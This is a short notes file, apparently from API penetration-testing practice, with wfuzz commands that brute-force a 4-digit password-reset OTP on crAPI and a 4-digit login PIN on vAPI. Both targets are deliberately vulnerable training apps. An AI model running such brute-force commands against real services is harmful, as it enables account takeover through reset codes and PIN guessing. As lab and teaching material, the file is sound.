# Added by Tom R.
# Use Wfuzz to scan an API where there is a number
# Starting at 0000 ending at 9999
# Using crAPI this is for Fuzzing the OTP code for the email reset.

# AP1-2023- Improper (Asset) Inventory Mgmt  - Credit Corey Ball

wfuzz -d '{"email":"tom@a.co", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi/identity/api/auth/v2/check-otp --hc 500 

# For vAPI 9

wfuzz -d '{"username":"richardbranson", "pin":"FUZZ"}' -H 'Content-Type:application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://vapi/vapi/api9/v1/user/login --hh 0 -t 100

# The “–hh 0” means hide responses with zero (0) characters. “-t 100” uses 100 threads.
# Credit https://www.narycyber.com/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/#api92019-improper-assets-management
